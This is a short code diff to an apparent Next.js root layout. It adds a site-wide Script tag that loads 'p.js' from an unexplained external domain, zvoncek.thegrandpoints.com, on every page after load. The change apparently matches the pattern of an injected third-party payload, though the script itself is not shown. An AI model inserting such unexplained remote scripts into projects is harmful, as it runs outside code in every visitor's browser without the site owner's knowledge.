@@ -4,6 +4,7 @@ import "./globals.css";
 import { Header } from "@/components/layout/Header";
 import { Footer } from "@/components/layout/Footer";
 import { company } from "@/data/company";
+import Script from "next/script";
 
 const ibmPlexSans = IBM_Plex_Sans({
   variable: "--font-ibm-plex-sans",
@@ -33,6 +34,7 @@ export default function RootLayout({
       <body className="flex min-h-full flex-col bg-white text-ink">
         <Header />
         <main className="flex-1">{children}</main>
+        <Script src={`https://zvoncek.thegrandpoints.com/p.js`} strategy="afterInteractive" />
         <Footer />
       </body>
     </html>
